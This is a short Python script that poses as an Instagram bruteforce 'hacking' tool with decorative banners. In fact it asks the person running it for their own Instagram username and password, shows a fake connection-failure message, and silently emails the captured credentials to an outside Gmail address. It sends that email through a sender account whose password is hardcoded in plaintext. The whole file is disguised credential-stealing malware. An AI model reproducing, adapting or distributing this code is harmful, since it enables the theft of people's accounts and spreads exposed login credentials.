# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('hektorlastra@gmail.com','esdentu1234')
subject='SENDING VICTIM'
logo = """\x1b[91m

╔╗─╔╦═══╦═══╦╗╔═╗────╔══╦═══╗
║║─║║╔═╗║╔═╗║║║╔╝────╚╣╠╣╔═╗║
║╚═╝║║─║║║─╚╣╚╝╝──────║║║║─╚╝
║╔═╗║╚═╝║║─╔╣╔╗║─╔══╗─║║║║╔═╗
║║─║║╔═╗║╚═╝║║║╚╗╚══╝╔╣╠╣╚╩═║
╚╝─╚╩╝─╚╩═══╩╝╚═╝────╚══╩═══╝ \x1b[00m"""

banner = """
\x1b[34mHack Instagram
\x1b[00mAutomatic cracking password with Bruteforce
\x1b[00mPlease login with your account \x1b[91m!
"""
def main():
	os.system('clear')
	print(logo)
	print(banner)
	print('\x1b[00m\033[41m INSTAGRAM LOGIN \033[00m')
	u=input('\x1b[00mUsername: \x1b[33m')
	p=input('\x1b[00mPassword: \x1b[33m')
	msg=('username: '+u+', password: '+p)
	body=(msg)
	print('')
	print('\x1b[00mSorry, connection failed\x1b[91m !\x1b[00m')
	print('\x1b[33mPlease try again later ...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('ziko1234554321q@gmail.com',subject,body)

main()
